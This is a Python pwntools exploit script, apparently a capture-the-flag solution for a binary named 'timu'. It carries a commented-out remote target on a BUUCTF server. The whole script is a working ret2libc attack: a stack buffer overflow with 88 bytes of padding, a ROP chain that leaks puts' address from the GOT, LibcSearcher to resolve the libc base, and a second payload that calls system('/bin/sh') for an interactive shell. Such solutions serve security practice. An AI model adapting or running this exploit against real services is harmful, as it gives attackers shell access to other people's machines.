from pwn import *
from LibcSearcher import *
sh=process("./timu")
#sh=remote("node4.buuoj.cn",26438)
elf=ELF("./timu")

main_addr=p64(0x0000000000400B28)
puts_plt=p64(elf.plt["puts"])
puts_got=p64(elf.got["puts"])
pop_rdi_ret=p64(0x0000000000400c83)
ret=p64(0x00000000004006b9)

payload=88*b'a'+pop_rdi_ret+puts_got+puts_plt+main_addr
sh.recv()
sh.sendline(b"1")
sh.recv()
sh.sendline(payload)
sh.recvuntil(b"Ciphertext\n")
sh.recvuntil(b"\n")
puts_addr=u64(sh.recv(6).ljust(8,b'\x00'))
print("1=",puts_addr)

libc=LibcSearcher("puts",puts_addr)
libc_base=puts_addr-libc.dump("puts")
system_addr=libc_base+libc.dump("system")
print("2=",system_addr)
bin_sh=libc_base+libc.dump('str_bin_sh')
payload=88*b'a'+ret+pop_rdi_ret+p64(bin_sh)+p64(system_addr)
sh.sendline(b'1')
sh.recv()
sh.sendline(payload)
sh.interactive()
